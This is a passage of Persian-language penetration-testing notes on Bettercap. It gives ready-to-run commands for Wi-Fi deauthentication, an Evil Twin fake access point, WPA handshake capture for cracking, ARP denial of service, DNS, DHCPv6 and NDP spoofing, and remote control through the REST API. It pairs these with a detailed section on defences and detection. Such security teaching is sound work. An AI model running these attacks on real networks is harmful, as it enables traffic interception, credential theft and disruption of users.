			2. انواع WPA/WPA2/WPA3 ساختمان هایی هستند که تعیین می‌کنند این رمزنگاری چگونه انجام شود.
		5. **بنابراین Encryption** مجموعه ای از موارد زیر است:
			1. نوع امنیت (WPA2/WPA3)
			2. نحوهٔ تبادل کلید (4-Way Handshake)
			3. الگوریتم رمزنگاری لایه 2 (AES/CCMP/GCMP)
			- **همه با هم تحت عنوان “Encryption” مطرح می‌شوند**
###### 2: `wifi.deauth` Deauthentication Attack Module
- **توضیحات ماژول:**
	1. **کارکرد:** ارسال بسته‌های Deauthentication برای قطع اتصال کلاینت‌ها از یک شبکه Wi-Fi.
		1. توضیحات تکمیلی در سرفصل WiFi Modules Extra Description(1-Deauthentication Attack)
	2. **سناریو استفاده:** آماده‌سازی برای حمله Evil Twin، یا گرفتن Handshake برای کرک رمز WPA.

- **روش استفاده:**
```sh
#Disconnect Specific Client ( قطع یک کلاینت خاص)
wifi.deauth 00:11:22:33:44:55

#Disconnect All Clients connect to Specific Access Point
#قطع تمام کلاینت‌های یک اکسس پوینت خاص 
wifi.deauth AA:BB:CC:DD:EE:FF --all
```

###### 3: `wifi.ap` Fake Access Point Creator Module
- **توضیحات ماژول:**
	1. **کارکرد:** ایجاد یک Access Point(نقطه دسترسی) جعلی با تنظیمات کاملاً قابل کنترل. (Evil Twin Attack)
		1. توضیحات تکمیلی در سرفصل WiFi Modules Extra Description(2-Evil Twin Attack)
	2. **سناریو استفاده:** ایجاد Evil Twin برای فریب کاربران و رهگیری ترافیک آنها.

- **روش استفاده:**
```sh
#Set Fake AP SSID (تنظیم نام اکسس پوینت جعلی)
set wifi.ap.ssid "Free_Corporate_WiFi"
#Set Fake AP WiFi Channel (تنظیم کانال وایرلس اکسس پوینت جعلی)
set wifi.ap.channel 11
#Set Fake AP Encryption Method (تنظیم متد رمزنگاری اکسس پوینت جعلی)
set wifi.ap.encryption false

#Launch Module with Custom Configuration 
#فعالسازی ماژول با تنظیمات مشخص شده
wifi.ap on
```
###### 4: `wifi.handshakes` Capture WPA/WPA2 Handshakes Module
- **توضیحات ماژول:**
	1. **کارکرد:** ضبط خودکار Handshake های WPA/WPA2 که می‌توانند برای کرک آفلاین و یافتن پسورد های ضعیف اکسس پوینت های وایرلسی استفاده شوند.
		1. توضیحات تکمیلی در سرفصل WiFi Modules Extra Description(3-WPA/WPA2 Handshakes)
	2. **سناریو استفاده:** جمع‌آوری هدفمند Handshake ها بدون نیاز به اسکریپت جداگانه.

- **روش استفاده:**
```sh
#Set path for Saving captured handshakes(تعیین مسیر ذخیره فایل دست دادن)
set wifi.handshakes.file /tmp/handshakes.pcap

#Enable Module (فعالسازی ماژول)
wifi.handshakes on
```
###### WiFi Modules Extra Description
1. **Deauthentication Attack:**
	1. **مقدمه:**
		1. در بستر شبکه‌ های بی‌سیم (Wi‑Fi)، یکی از آسیب‌ پذیرترین نقاط، ماهیت غیرمتمرکز و Broadcast محور ارتباطات لایه دوم (IEEE 802.11) است. 
		2. در این معماری، فریم‌ها در محیط آزاد بی‌سیم منتقل می‌شوند و هر کلاینت می‌تواند بدون احراز هویت در کانال شنود کند یا حتی فریم‌هایی جعلی ارسال نماید.
		3. دو حمله‌ی کلاسیک اما قدرتمند که مبتنی بر این ضعف هستند، عبارت‌اند از:
			- **Deauthentication Attack**
			- **Evil Twin Attack**
		4. این دو حمله اغلب به صورت ترکیبی برای ایجاد حملات **Man-in-the-Middle (MITM)** در محیط‌های Wi‑Fi مورد استفاده قرار می‌گیرند.
	2. **تعریف و مبانی حمله:**
		1. در استاندارد 802.11، فرایند ارتباط بین Client و Access Point شامل چند مرحله است: 
			1. `Probe → Authentication → Association`
		2. در ادامه‌ی این چرخه و برای اتمام ارتباط، از فریم‌های خاصی به نام Deauthentication و Disassociation استفاده می‌شود.
		3. در یک حمله‌ی Deauthentication، مهاجم این فریم‌ ها را به‌صورت جعلی برای قربانی ارسال می‌کند، در حالی که خود را ‌بجای Access Point یا Client جا می‌زند. 
		4. نتیجه این است که قربانی از شبکه‌ی بی‌سیم خارج شده و ارتباطش با AP قطع می‌شود.
	3. **ویژگی‌های فنی حمله:**
		- Frame Type: Management Frame
		- Subtype: Deauthentication (0x0C)
		- Authentication Required: None
		- Encryption: None (plaintext at MAC layer)
		- Effect: Disconnect Client from Network, and Rerun Authentication/Association
			- قطع اتصال کاربر از شبکه، اجرای مجدد فرآیند احراز هویت و پیوستگی
	4. **کاربرد در حملات ترکیبی (با Evil Twin):**
		1. این حمله به‌تنهایی صرفاً باعث قطع اتصال کاربران می‌شود، اما اهمیت واقعی‌ اش زمانی روشن می‌شود که در کنار حمله‌های دیگری‌ مانند Evil Twin Attack به‌کار گرفته شود تا کاربر به یک شبکه‌ جعلی وایرلس Fake Access Point متصل شود.
2. **Evil Twin Attack:**
	1. **تعریف و مبانی حمله:**
		1. حمله Evil Twin به یک Access Point جعلی گفته می‌شود که با جعل SSID یا حتی آدرس MAC(BSSID) شبیه به Access Point واقعی، کاربران را فریب میدهد تا به آن متصل شوند.
		2. به بیان دیگر، مهاجم با ایجاد یک نقطه‌ی دسترسی جعلی با مشخصات مشابه AP واقعی، ترافیک شبکه‌ی قربانی را در اختیار می‌گیرد و ‌بصورت کامل در مسیر ارتباطی (MITM) قرار می‌گیرد.
	2. **منطق عملکرد:**
		1. مهاجم ابتدا SSID هدف را شناسایی می‌کند (از طریق ابزارهایی مانند `airodump-ng`، `bettercap`, یا ماژول `wifi.recon`).
		2. سپس یک AP جعلی‌ با همان SSID، اما با سیگنال قوی‌ تر راه‌ اندازی می‌کند.
		3. با اجرای حمله‌ی Deauthentication، کلاینت‌ها را از AP واقعی جدا کرده و سپس با سو استفاده از قابلیت Auto Reconnect به شبکه وایرلس، آنها را به AP جعلی خود هدایت می‌کند.
	3. **پس از اتصال قربانی، مهاجم می‌تواند:**
	    1. ترافیک را مانیتور، تغییر، یا تزریق نماید؛
	    2. اعتبارنامه‌ها و کوکی‌ها را جمع‌آوری کند؛
	    3. یا کاربر را به سرویس‌های فیشینگ هدایت کند.
3. **WPA/WPA2 Handshake:**
	1. **مفهوم Handshake در WPA/WPA2:**
		1. استانداردهای WPA (Wi-Fi Protected Access) و WPA2، پروتکل‌های امنیتی پرکاربرد برای شبکه‌های بی‌سیم هستند که با هدف حفظ حریم خصوصی و یکپارچگی داده‌ها طراحی شده‌اند. 
		2. هسته‌ی اصلی این پروتکل‌ها، مکانیزم چهار مرحله‌ای دست‌دهی (Four-Way Handshake) است که در زمان اتصال یک کلاینت جدید به Access Point (AP) اجرا می‌شود.
	2. **هدف از Handshake:**
		1. هدف اصلی این دست‌دهی، ایجاد یک کلید رمزنگاری موقت و منحصربه‌فرد به نام Pairwise Transient Key (PTK) است. 
		2. این PTK برای رمزنگاری تمام ترافیک بین کلاینت و AP در طول آن جلسه‌ اتصال استفاده می‌شود. فرآیند Handshake اطمینان حاصل می‌کند که:
			1. **احراز هویت کلاینت:** AP مطمئن می‌شود که کلاینت، کلید از پیش اشتراک‌گذاری شده (Pre-Shared Key - PSK) یا اعتبارنامه‌ های Enterprise (مانند RADIUS) را در اختیار دارد.
			2. **تبادل امن کلید:** PTK به‌صورت امن بین کلاینت و AP تبادل می‌شود، بدون آنکه مستقیماً از طریق هوا به صورت متن ساده (plaintext) ارسال شود.
	3. **مراحل Four-Way Handshake:**
		1. **AP to Client: Anonce (AP’s Nonce)**
			- اکسس پوینت AP یک عدد تصادفی (Nonce) به نام `Anonce` را به کلاینت ارسال می‌کند.
			- همچنین AP یک شمارنده‌ی بروزرسانی (AP’s Replay Counter) و اطلاعات مربوط به پروتکل امنیتی (مانند Pairwise Cipher Suite) را ارسال می‌کند.
		2. **Client to AP: Snonce (Supplicant’s Nonce) & Message Integrity Check (MIC)**
			- کلاینت یک عدد تصادفی دیگر به نام `Snonce` تولید و به همراه `Anonce` دریافتی، کلید موقت `PTK` را محاسبه می‌کند.
			- کلاینت سپس با استفاده از `PTK` و داده‌ های دریافتی، یک کد بررسی یکپارچگی پیام (MIC) تولید کرده و همراه با `Snonce` و شمارنده‌ی بروزرسانی خود به AP ارسال می‌کند.
		3. **AP to Client: Group Temporal Key (GTK) and Confirm MIC**
			- اکسس پوینت AP نیز با استفاده از `Anonce` و `Snonce` دریافتی، `PTK` را محاسبه کرده و صحت MIC دریافتی از کلاینت را بررسی می‌کند.
			- در صورت تأیید، AP یک کلید رمزنگاری گروهی (GTK) تولید کرده و آن را به همراه شمارنده‌ی بروزرسانی به کلاینت ارسال می‌کند.
		4. **Client to AP: Confirm GTK**
			- کلاینت پیام دریافتی را تأیید کرده و با این پیام، اتصال به صورت موفقیت‌آمیز کامل می‌شود.
			- از این پس، تمام ترافیک بین کلاینت و AP با استفاده از PTK رمزنگاری می‌شود.
	4. **کاربرد Handshake در حملات:**
		1. مهاجمان با تحلیل این فرآیند، می‌توانند به رمز عبور شبکه (PSK) دست پیدا کنند. نکته‌ی کلیدی این است که خود Handshake رمزنگاری نمی‌شود؛ بلکه این فرآیند برای تولید کلید رمزنگاری (PTK)است.
		2. مهاجم می‌تواند در زمان اجرای Handshake، بسته‌های اطلاعاتی (Packet Capture) را شنود کند.
		3. سپس فایل به دست آمده از این شنود (که حاوی چهار بسته‌ی Handshake است)، مبنای حملات شکستن رمز عبور قرار می‌گیرد.
	5. **شبیه‌سازی استخراج Handshake با Bettercap (`wifi.handshakes`)**
		1. در سرفصل Bonus: Cheat Sheet of Cracking WPA/WPA2 Handshakes روش شبیه سازی این حمله را بصورت کامل بررسی میکنیم.
4. **Conclusions:**
	1. ترکیب دو حمله‌ی Deauthentication و Evil Twin یکی از مؤثرترین روش‌ها برای اجرای حملات Man-in-the-Middle در شبکه‌ های بی‌سیم است.
	2. حمله Deauthentication کاربران را از AP واقعی جدا می‌کند، و Evil Twin با جعل شبکه‌ی مشابه، قربانی را به دام خود می‌کشاند.
	3. ابزار Bettercap یک محیط ماژولار فراهم کرده که این فرآیند را با دقت بالا و قابلیت مانیتورینگ در لحظه پیاده‌سازی می‌کند.
###### WiFi Attacks Security/Defensive Solutions
- **Introduction:**
	- رایج ترین حملات در شبکه های وایرلس شامل موارد زیر میشود:
		1. Deauthentication Attack
		2. Evil Twin Attack
		3. Cracking/Capturing WPA/WPA2 Handshakes
		4. WiFi Reconnaissance(حمله مجزا نیست اما مرحله ابتدایی سایر حملات است)
	- در سرفصل Implement Common Attacks شبیه سازی این حملات بصورت کامل و قدم به قدم انجام میشود.

**WiFi Reconnaissance:**
1. *Defense Methods:*
	1. **پنهان کردن SSID (SSID Cloaking/Hidden SSID):**
		- عملکرد: AP ها را طوری پیکربندی کنید که SSID خود را در Beacon Frames منتشر نکنند. کلاینت‌ها باید به طور دستی SSID را برای اتصال وارد کنند.
		- نکته: این روش یک دفاع ضعیف است، زیرا مهاجم با شنود بسته‌های Probe Request و Probe Response همچنان می‌تواند SSID را شناسایی کند. همچنین، اتصال کاربران را دشوارتر می‌کند.
	2. **استفاده از WPA3 و 802.1X/RADIUS:**
		- این پروتکل‌ها، اطلاعات کمتری را در فریم‌های مدیریت منتشر می‌کنند و احراز هویت را به شدت امن‌تر می‌سازند، که شناسایی شبکه را برای مهاجم سخت‌تر می‌کند.
	3. **محدود کردن Beacon Frames:**
		- برخی APهای پیشرفته اجازه می‌دهند تا نرخ ارسال Beacon Frames کاهش یابد، که شناسایی AP را کمی کندتر می‌کند.
	4. **ایزوله‌سازی شبکه:**
		- جدا کردن شبکه‌ی مهمان (Guest Network) از شبکه‌ی اصلی (Internal Network).
		- استفاده از VLANها برای تقسیم‌بندی شبکه‌ی داخلی.
2. *Detection Methods:*
	1. **شناسایی اسکنرهای بی‌سیم (Scanner Detection):**
	- سیستم های امنیتی WIDS/WIPSها می‌توانند ترافیک خاصی که توسط ابزارهای شناسایی مانند `airodump-ng`، `kismet`، یا `bettercap` تولید می‌شود را تشخیص دهند. این ترافیک شامل درخواست‌های Probe Request زیاد، یا الگوهای منظم شنود است.
	2. **مانیتورینگ Beacon Frames و Probe Requests:**
		- بررسی ترافیک برای یافتن تعداد غیرعادی Beacon Frames یا Probe Requests، به ویژه از منابع ناشناس.
	3. **شناسایی دستگاه‌های ناشناس:**
		- پایش مداوم لیست دستگاه‌های متصل به شبکه. شناسایی دستگاه‌هایی که قبلاً دیده نشده‌اند و ممکن است متعلق به مهاجم باشند.
3. *Monitoring Methods:*
	1. **استفاده از ابزارهای تحلیلگر بی‌سیم:**
		- ابزار های `Wireshark`, `Kismet`, `Airodump-ng`: برای مشاهده‌ی تمام شبکه‌های Wi-Fi موجود، SSIDها، BSSIDها، کانال‌ها، قدرت سیگنال و نوع رمزنگاری. مهاجم از این ابزارها برای جمع‌آوری اطلاعات استفاده می‌کند، اما مدیر شبکه نیز می‌تواند از آن‌ها برای درک محیط خود و شناسایی فعالیت‌های غیرمعمول بهره ببرد.
	2. **پایش دوره‌ای شبکه:**
		- انجام اسکن‌های دوره‌ای برای اطمینان از اینکه هیچ AP ناشناس یا مخربی در نزدیکی شبکه ظاهر نشده است.
	3. **ثبت و تحلیل ترافیک (Passive Monitoring):**
		- استفاده از سیستم‌های WIDS/WIPS برای ثبت مداوم رویدادها و تحلیل رفتارهای مشکوک که می‌تواند نشان‌دهنده‌ی مرحله‌ی شناسایی مهاجم باشد.

**Deauthentication Attack:**
1. *Defense Methods:*
	1. **استفاده از پروتکل 802.11w (Protected Management Frames - PMF):**
		- **عملکرد:** این استاندارد، فریم‌های مدیریت مهم (مانند Deauthentication و Disassociation) را رمزنگاری و احراز هویت می‌کند. با فعال‌سازی PMF اکسس پوینت AP و کلاینت‌ها فقط فریم‌ های مدیریت معتبر و از سوی خودشان را می‌پذیرند، و ارسال فریم‌ های جعلی Deauthentication توسط مهاجم بی‌اثر می‌شود.
		- **پیاده‌سازی:** هم AP و هم کلاینت‌ها باید از 802.11w پشتیبانی کرده و آن را فعال کنند. این گزینه معمولاً در تنظیمات پیشرفته‌ی AP های مدرن موجود است (به نام‌هایی مانند “Management Frame Protection” یا “PMF” شناخته می‌شود).
	2. **افزایش قدرت سیگنال AP:**
		- اگر AP اصلی دارای سیگنال قوی‌ تری نسبت به هر سیگنال جعلی باشد، کلاینت‌ ها تمایل کمتری به دریافت فریم‌ های مدیریت از منابع دورتر (مهاجم) خواهند داشت.
		- البته این روش یک راهکار کامل نیست، زیرا مهاجم نیز می‌تواند سیگنال خود را تقویت کند.
	3. **نظارت بر رویدادهای اتصال/قطع اتصال:**
		1. در شبکه‌های بزرگتر، ثبت و بررسی رویدادهای اتصال و قطع اتصال کلاینت‌ها می‌تواند به شناسایی الگوهای غیرعادی کمک کند.
2. *Detection Methods:*
	1. **سیستم‌ های تشخیص نفوذ بی‌سیم (WIDS/WIPS):**
		- این سیستم‌ها به طور مداوم ترافیک بی‌سیم را برای شناسایی الگوهای مشکوک، از جمله نرخ بالای بسته‌های Deauthentication، بسته‌های مدیریت بدون احراز هویت، و ترافیک غیرمعمول، پایش می‌کنند.
	2. **تحلیل لاگ‌ های Access Point:**
		- برخی AP ها اطلاعات مربوط به تلاش‌های اتصال یا قطع اتصال را در لاگ‌های خود ثبت می‌کنند.
		- تحلیل این لاگ‌ها برای یافتن الگوهای غیرعادی (مانند قطع مکرر اتصال یک کلاینت خاص) می‌تواند مفید باشد.
	3. **پایش نرخ بسته‌ های مدیریت:**
		- ابزارهای پیشرفته می‌توانند نرخ بسته‌های مدیریت (Management Frames) را در یک کانال یا BSSID خاص اندازه‌گیری کنند. افزایش ناگهانی و غیرعادی این نرخ، به ویژه بسته‌های Deauthentication، نشان‌دهنده‌ی حمله است.
3. *Monitoring Methods:*
	1. **استفاده از ابزارهای تحلیلگر پروتکل:**
		- ابزارهایی مانند Wireshark با قابلیت Monitor Mode، به شما امکان می‌دهند بسته‌های Deauthentication را در هوا مشاهده کنید. 
		- با فیلتر کردن بر اساس `wlan.fc.type_subtype == 0x0c` می‌توانیم تمام بسته‌های Deauthentication را مشاهده کنیم.
		- تحلیل آدرس MAC مبدأ و مقصد این بسته‌ها می‌تواند به شناسایی مهاجم و قربانیان کمک کند.
	2. **بهره‌گیری از ماژول‌های Bettercap:**
		- همانطور که پیشتر ذکر شد، `wifi.recon` و `wifi.deauth` در Bettercap قابلیت‌ هایی برای مشاهده‌ی ترافیک و اجرای حمله دارند. 
		- با استفاده از این ابزار ، می‌توانیم الگوهای ارتباطی و بسته‌های مدیریتی را بررسی کنیم.
	3. **ثبت و آنالیز ترافیک شبکه‌ی بی‌سیم:**
		- استفاده از راه‌حل‌ های SIEM یا Security Information and Event Management که لاگ‌ ها و هشدارهای WIDS/WIPS و AP ها را جمع‌آوری و تحلیل می‌کنند.

**Evil Twin Attack:**
1. *Defense Methods:*
	1. **استفاده از Wi-Fi Enterprise (802.1X/RADIUS):**
		- این روش، قوی‌ترین دفاع در برابر Evil Twin است. در این حالت، احراز هویت به جای یک رمز عبور اشتراکی، توسط یک سرور مرکزی (RADIUS) انجام می‌شود. 
		- هر کاربر دارای گواهی‌نامه یا نام کاربری/رمز عبور منحصربه‌فرد خود است. AP جعلی نمی‌تواند این فرآیند احراز هویت را تقلید کند، زیرا به سرور RADIUS دسترسی ندارد.
	2. **فعال‌سازی WPA3:**
		- نوع امنیت WPA3 دارای مکانیزم SAE (Simultaneous Authentication of Equals) است که احراز هویت را قوی‌تر کرده و اتصال به APهای جعلی را دشوارتر می‌سازد، حتی اگر SSID یکسان باشد.
	3. **آموزش کاربران:**
		- آگاه‌سازی کاربران در مورد خطرات اتصال به شبکه‌های Wi-Fi عمومی با SSIDهای مشکوک.
		- آموزش کاربران برای بررسی دقت SSID، خصوصاً در محیط‌های اداری یا حساس.
		- اطلاع‌رسانی در مورد نشانه‌های یک AP جعلی (مثلاً درخواست رمز عبور در مکانی که نباید، یا مشکلات اتصال).
	4. **استفاده از VPN:**
		- تشویق کاربران به استفاده از VPN هنگام اتصال به شبکه‌های Wi-Fi عمومی. VPN ترافیک را از ابتدا تا انتها رمزنگاری می‌کند و حتی اگر کاربر به یک AP جعلی متصل شود، مهاجم به داده‌های اصلی دسترسی نخواهد داشت.
2. *Detection Methods:*
	1. **شناسایی SSIDهای تکراری (Duplicate SSIDs):**
		- ابزارهای WIDS/WIPS می‌توانند شبکه‌هایی را که دارای BSSIDهای متفاوت اما SSIDهای یکسان هستند، شناسایی کنند. این یکی از نشانه‌های اصلی حمله‌ی Evil Twin است.
		- ابزارهایی مانند `Kismet` یا `Airodump-ng` در حالت شنود، می‌توانند تمام  های موجود در کانال‌ها را لیست کنند و شناسایی SSIDs تکراری را آسان‌تر سازند.
	2. **بررسی قدرت سیگنال APهای یکسان:**
		- اگر یک AP با SSID مشخص، دارای قدرت سیگنال به طور قابل توجهی قوی‌تر از AP اصلی باشد، می‌تواند نشانه‌ی Evil Twin باشد.
	3. **پایش بسته‌های مدیریت:**
		- مشاهده‌ی تعداد زیاد بسته‌های Deauthentication که به سمت کلاینت‌های یک AP خاص ارسال می‌شود، می‌تواند نشانه‌ی تلاش برای هدایت کلاینت‌ها به یک AP دیگر (Evil Twin) باشد.
	4. **تحلیل ترافیک:**
		- اگر AP جعلی به درستی پیکربندی نشده باشد، ممکن است ترافیک کاربران را به درستی مسیریابی نکند یاDNS requests را دستکاری کند.
3. *Monitoring Methods:*
	1. **استفاده از ابزارهای شنود و تحلیل بی‌سیم:**
		- ابزار های `Wireshark`، `Kismet`، `Airodump-ng`: این ابزارها به شما اجازه می‌دهند تا لیست AP ها، کلاینت‌ ها، BSSID ها، SSID ها و کانال‌ ها را مشاهده کنیم و به دنبال موارد غیرعادی مانند SSID های تکراری یا AP هایی با قدرت سیگنال بسیار بالا باشید.
	2. **پایش خودکار با WIDS/WIPS:**
		- این سیستم‌ها به طور مداوم شبکه‌ی بی‌سیم را اسکن کرده و در صورت شناسایی ترافیک مشکوک (مانند APهای جعلی با SSIDهای تکراری)، هشدارهای لازم را صادر می‌کنند.
	3. **بررسی لاگ‌های AP:**
		- مانیتورینگ لاگ‌های APهای معتبر برای رویدادهای غیرعادی مانند قطع مکرر اتصال کلاینت‌ها یا اتصال به APهای ناشناس.

**Cracking/Capturing WPA/WPA2 Handshakes:**
1. *Defense Methods:*
	1. **استفاده از رمزهای عبور قوی (PSK):**
		- اهمیت: این اولین و مهم‌ترین خط دفاعی است. رمزهای عبور ضعیف به راحتی با حملات Dictionary Attack قابل کشف هستند.
		- ویژگی‌های رمز قوی: طولانی (حداقل 12-15 کاراکتر)، ترکیبی از حروف بزرگ و کوچک، اعداد و نمادها، و عدم استفاده از عبارات رایج یا اطلاعات شخصی.
	2. **اجرای WPA3:**
		- نوع امنیت WPA3 با مکانیزم SAE، جلوی حملات آفلاین Brute-Force بر روی Handshake را می‌گیرد. حتی اگر مهاجم Handshake را شنود کند، قادر به کرک کردن رمز عبور نخواهد بود.
	3. **استفاده از WPA2-Enterprise (802.1X):**
		- این روش، رمز عبور اشتراکی (PSK) را حذف کرده و احراز هویت را به سرور RADIUS منتقل می‌کند. این امر عملاً قابلیت کرک کردن Handshake را از بین می‌برد، زیرا دیگر PKT برای کرک کردن وجود ندارد.
2. *Detection Methods:*
	1. **شناسایی حملات Deauthentication:**
		- همانطور که در بخش قبل ذکر شد، حملات Evil Twin و Deauthentication اغلب برای پیاده سازی کرک کردن Handshake استفاده می‌شوند. 
		- بنابراین، شناسایی این حملات (با استفاده از WIDS/WIPS یا تحلیل ترافیک) می‌تواند نشان‌دهنده‌ی احتمال تلاش برای کرک کردن Handshake باشد.
	2. **پایش بسته‌های EAPoL (Extensible Authentication Protocol over LAN):**
		- بسته‌های EAPoL بخش کلیدی فرآیند Handshake هستند. تحلیل ترافیک برای شناسایی تعداد زیاد بسته‌های EAPoL که بین کلاینت و AP در حال تبادل است، می‌تواند نشان‌دهنده تلاش برای اجرای Handshake باشد.
	3. **شناسایی کاربران در حالت “Not Associated” یا “Unauthenticated”:**
		- اگر سیستمی، تعداد زیادی کلاینت را در حالت ناپایدار (در حال اتصال مجدد یا هنوز احراز هویت نشده) تشخیص دهد، ممکن است نشانه‌ی حمله Deauth برای گرفتن Handshake باشد.
3. *Monitoring Methods:*
	1. **ثبت و تحلیل ترافیک (Packet Capture):**
		- استفاده از ابزارهایی مانند Wireshark یاtcpdump برای ضبط مداوم ترافیک روی کانال‌های Wi-Fi. سپس تحلیل این ترافیک برای یافتن الگوهای Handshake (شامل چهار بسته EAPoL).
	2. **استفاده از ابزارهای تخصصی:**
		- ابزارهایی مانند `aircrack-ng suite` (شامل `airodump-ng`) و `bettercap` (با ماژول `wifi.handshakes`) برای مشاهده و ضبط فعال Handshakeها طراحی شده‌اند. پایش خروجی این ابزارها در حالت شنود می‌تواند نشان‌دهنده‌ی فعالیت مهاجم باشد.
	3. **بررسی لاگ‌های AP:**
	- اگر APها امکان ثبت رویدادهای مربوط به اتصال کلاینت‌های جدید را داشته باشند، مانیتورینگ این لاگ‌ها برای الگوهای غیرعادی (مانند تلاش‌های مکرر برای اتصال) می‌تواند مفید باشد.

- **Conclusion:**
	- تأمین امنیت در برابر حملات شبکه‌های بی‌سیم نیازمند یک رویکرد چندلایه است. ترکیب استفاده از پروتکل‌های امنیتی مدرن (WPA3، 802.1X)، رمزهای عبور قوی، آموزش کاربران، و بهره‌گیری از ابزارهای پیشرفته‌ی شناسایی و پایش (WIDS/WIPS، تحلیلگرهای پروتکل) می‌تواند سطح امنیت شبکه‌ی شما را به طور چشمگیری افزایش دهد.
##### Bettercap: Attack & Exploitation Modules
###### 1: `arp.ban` DoS with ARP Poison Modules
- **توضیحات ماژول:**
	1. **کارکرد:** قطع کامل دسترسی یک دستگاه به شبکه با ارسال مداوم بسته‌ های ARP بصورت یک‌ طرفه (بدون Forwarding).
	2. **سناریو استفاده:** حذف موقت یک دستگاه مزاحم یا شبیه‌سازی حمله منع سرویس DoS در شبکه محلی.

- **روش استفاده:**
```sh
#Set target/targets IP (تنظیم آیپی هدف/اهداف)
set arp.ban.targets 192.168.1.5

#Enable Module (فعالسازی ماژول)
arp.ban on
```
###### 2: `dns.spoof` Change DNS Records Modules
- **توضیحات ماژول:**
	1. **کارکرد:** پاسخ به درخواست‌های DNS با IP جعلی برای هدایت هدف به سرور دلخواه.(حمله DNS spoofing یا DNS cache poisoning)
	2. **سناریو استفاده:** فیشینگ، هدایت هدف به سرور به‌روزرسانی جعلی، یا مسدودسازی دسترسی به سایت‌های خاص.

- **روش استفاده:**
```sh
set dns.spoof.domains *.google.com, *.youtube.com
set dns.spoof.address 192.168.1.99
dns.spoof on
```

**توضیحات تکمیلی:**
- **حمله DNS Spoofing یا DNS Cache Poisoning:**
	1. به تزریق اطلاعات جعلی در کش سرورهای DNS گفته می‌شود، بطوری‌که درخواست‌ های کاربر به آدرس IP نادرست هدایت شده و معمولاً به سایت‌ های مخرب یا فیشینگ منتقل می‌شوند.
	2. این حمله در سطح شبکه انجام می‌شود و تغییری در رکورد های دامنه در سرویس‌ دهنده DNS ایجاد نمیکند.
	3. **روش‌های جلوگیری:** استفاده از DNSSEC، استفاده از DNS های معتبر (Quad9، Cloudflare 1.1.1.1)، مانیتورینگ همواره سرور.
	4. **نکته:** در فصل های بعدی این حمله را به همراه روش پیاده سازی و شناسایی بصورت کامل بررسی میکنیم.
###### 3: `dhcp6.spoof` DHCPv6 Spoofing Modules
- **توضیحات ماژول:**
	1. **کارکرد:** جعل سرور DHCPv6 برای تزریق تنظیمات مخرب DNS یا Gateway به کلاینت‌ های IPv6.
	2. **سناریو استفاده:** شبکه‌های مدرن با IPv6 فعال.

- **روش استفاده:**
```sh
#Set target/targets (تنظیم اهداف)
set dhcp6.spoof.dns 2001:db8::1

#Enable Module (فعالسازی ماژول)
dhcp6.spoof on
```

**توضیحات تکمیلی:**
- **حمله DHCP Spoofing:**
	1. حمله DHCP Spoofing یک حمله است که در آن مهاجم یک سرور DHCP جعلی راه‌ اندازی می‌کند و به درخواست‌ های کلاینت‌ ها پاسخ می‌دهد.
	2. این کار باعث می‌شود دستگاه‌ ها IP های مورد نظر مهاجم را دریافت کنند و به Gateway یا DNS نادرست متصل شوند و در نتیجه مهاجم میتواند ترافیک شبکه را هدایت یا مسدود کند.
	3. **دفاع:** فعال‌سازی DHCP Snooping، محدود کردن دسترسی به پورت‌ های شبکه، استفاده از MAC‑Based binding و بررسی لاگ‌های سرور DHCP می‌باشد.
	4. **نکته:** در فصل های بعدی این حمله را به همراه روش پیاده سازی و شناسایی بصورت کامل بررسی میکنیم.
###### 4: `ipv6.ndp.spoof` ARP Spoofing on IPv6
- **توضیحات ماژول:**
	1. **کارکرد:** پیاده سازی حمله NDP Spoofing که معادل معادل ARP Spoofing برای IPv6 است.
	2. **سناریو استفاده:** اجرا معادل ARP Spoofing برای شبکه‌ های مدرنی که به صورت کامل یا ترکیبی از IPv6 استفاده می‌کنند.

- **روش استفاده:**
```sh
#Set target/targets (تنظیم هدف/اهداف)
set ipv6.ndp.spoof.targets fe80::1234:5678

#Enable Module(فعالسازی ماژول)
ipv6.ndp.spoof on
```

**توضیحات تکمیلی:**
- **حمله NDP Spoofing:**
	1. حمله NDP Spoofing، همانند ARP Poisoning(ARP Spoofing) در IPv4 است.
	2. در این حمله بوسیله ارسال پیام‌ های Neighbor Advertisement (NA) یا Neighbor Solicitation (NS) تقلبی، مهاجم میتواند جداول همسایگی را Manipulate کند و خود را به‌ عنوان همسایه‌ معتبر در شبکه نشان دهد.
	3. در نتیجه مهاجم میتواند ترافیک های شبکه را به سمت خود هدایت کند.
	4. **هدف اصلی:** جابه‌جایی آدرس MAC یا IP، تزریق ترافیک، یا دسترسی غیرمجاز به داده‌ها.
	5. **روش شناسایی:** بررسی تکرار پیام‌ های NA با همان عنوان MAC در یک بازه کوتاه، یا بررسی اختلاف در TTL و زمان‌ بر بودن پاسخ.
	6. **پیشگیری و دفاع:** فعال‌ سازی Secure Neighbor Discovery (SEND)، استفاده از فایروال‌های لایه‌ی 2 برای فیلتر کردن NDP، و بروزرسانی فریم‌ ورک‌ های شبکه برای جلوگیری از فیلتر NDP spoofed.
##### Bettercap: REST API Module `api.rest`
###### Introduction to REST API Module
- **توضیحات:**
	1. **نوع:** ماژول کنترلر
	2. **کارکرد:** فعال‌ سازی REST API برای کنترل کامل Bettercap از طریق درخواست‌ های HTTP بوسیله ابزار هایی مانند `Curl, Python Requests, Invoke-WebRequest, ...`
	3. **سناریو استفاده:** اتوماسیون حملات، یکپارچه‌ سازی با اسکریپت‌ های پایتون، یا کنترل از راه دور.
###### Enable REST API Module
- **روش استفاده:** 
1. **قدم صفر: فعال کردن ماژول:**
```sh
#Enable Module (فعالسازی ماژول)
api.rest on

#Now we can control Bettercap using HTTP Requests
```
2. حال میتوانیم با ابزار های مختلفی Bettercap را از راه دور کنترل کنیم. در زیر چند مورد از این ابزار ها را بررسی میکنیم.
###### Controlling Method 1(General): `curl`
1. **ابزار `curl` چیست؟**
	- کامند `curl`، ابزاری قدیمی، قدرتمند و پراستفاده  برای ارسال درخواست های HTTP در تمامی حالات است.
	- این ابزار بصورت پیشفرض در اکثر توزیع های لینوکس نصب است، اما اگر در توزیع شما نصب نبود میتوانید از یکی از روش های زیر براساس توزیع خود برای نصب ابزار استفاده کنید.
2. **نصب Curl در لینوکس:**
	- `sudo apt update -y && sudo apt install curl -y` Debian Based
	- `sudo yum update && sudo yum install curl` Old Red Hat Based Linux
	- `sudo dnf update && sudo dnf install curl` New Red Hat Based Linux
3. **نصب Curl در ویندوز - روش اول بوسیله `winget`:**
	- ابزار `curl` در ویندوز هم در دسترس است. برای استفاده باید آنرا نصب کنیم. آسان ترین روش نصب آن استفاده از کامند مدیریت بسته های ویندوز `winget` است:
	- `winget install curl.curl` or `winget install curl`
